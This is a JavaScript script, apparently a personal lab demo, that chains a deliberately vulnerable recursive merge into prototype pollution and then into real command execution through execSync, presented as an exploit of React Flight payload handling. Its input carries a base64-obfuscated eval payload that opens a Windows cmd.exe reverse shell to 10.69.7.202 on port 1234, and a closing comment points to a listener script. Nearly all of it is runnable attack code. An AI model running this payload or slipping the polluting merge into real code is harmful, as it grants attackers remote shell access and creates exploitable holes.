// --- THE INFRASTRUCTURE (The "Invisible" Linking) ---

// In JS, we don't need "calling_given_gadget" because 
// the Prototype Chain links objects automatically.
const gadgetMap = {
    "LogGadget": (data) => console.log(`[LOG]: Processing ${data}`),
    "ConfigGadget": (obj) => {
            // This gadget looks for a "shell" property.
            // If polluted, it finds it on the prototype!
        const shell = obj.shell || "/bin/sh"; 
        console.log(`[CONFIG]: Using shell: ${shell}`);
        return shell;
    }
};

// --- THE VULNERABLE BACKEND (The Source & Sink) ---

// 1. THE SINK: A dangerous function that executes system commands
const execSink = (cmd) => {
    console.log(`\n!!! [SINK REACHED] !!!`);
    console.log(`[SHELL]: Executing -> ${cmd}`);

        // this shows nothing on the cmd, but it ran -> real attack
    // require('child_process').execSync(cmd)

    const { execSync } = require('child_process');
    const output = execSync(cmd);
    console.log(output.toString());
    
    
};

    // 2. THE VULNERABLE SOURCE: A "Recursive Merge" (common in Flight Protocol handlers)
function flightDeepMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
                // THE POLLUTION: Merging __proto__ affects ALL objects in the system
            Object.assign(Object.prototype, source[key]);
        } else if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            flightDeepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
















// --- THE ATTACK (The "Bombaclat" Moment) ---

function handleFlightRequest(incomingPayload) {
    let internalState = {};

    console.log("--- Step 1: Deserializing Flight Payload ---");
    flightDeepMerge(internalState, incomingPayload);

    console.log("--- Step 2: Triggering Gadget Chain ---");
        // GADGET 1: A legitimate call to a config utility
    const currentShell = gadgetMap["ConfigGadget"](internalState);
        // GADGET 2: A logic branch that uses the "shell" we just retrieved
    if (currentShell && internalState.execute) {
            // THE SINK
        execSink(`${currentShell} -e "${internalState.args}"`);
        // execSink(`${currentShell} -c "${internalState.args}"`);
    }
}

// --- THE MALICIOUS INPUT ---

const unverifiedReactFlightPayload = {
        // This looks like normal data, but 'proto' injects 'shell' into EVERY object
    "__proto__": {
        "shell": "node", 
        "execute": true 
    },
    "args": "eval(Buffer.from('CmNvbnN0IG5ldD1yZXF1aXJlKCduZXQnKSx7c3Bhd259PXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKSxjbGllbnQ9bmV3IG5ldC5Tb2NrZXQoKTsKY2xpZW50LmNvbm5lY3QoMTIzNCwnMTAuNjkuNy4yMDInLCgpPT57CiAgICBjb25zdCBzPXNwYXduKCdjbWQuZXhlJyxbXSx7c2hlbGw6dHJ1ZX0pOwogICAgY2xpZW50LnBpcGUocy5zdGRpbik7CiAgICBzLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICBzLnN0ZGVyci5waXBlKGNsaWVudCk7Cn0pOw==','base64').toString())"
};  

// Start the simulation
handleFlightRequest(unverifiedReactFlightPayload);

// node "c:\Users\admin\Dropbox\vspython\WebVulnerabilities\js_reverse_shell\listenner.js"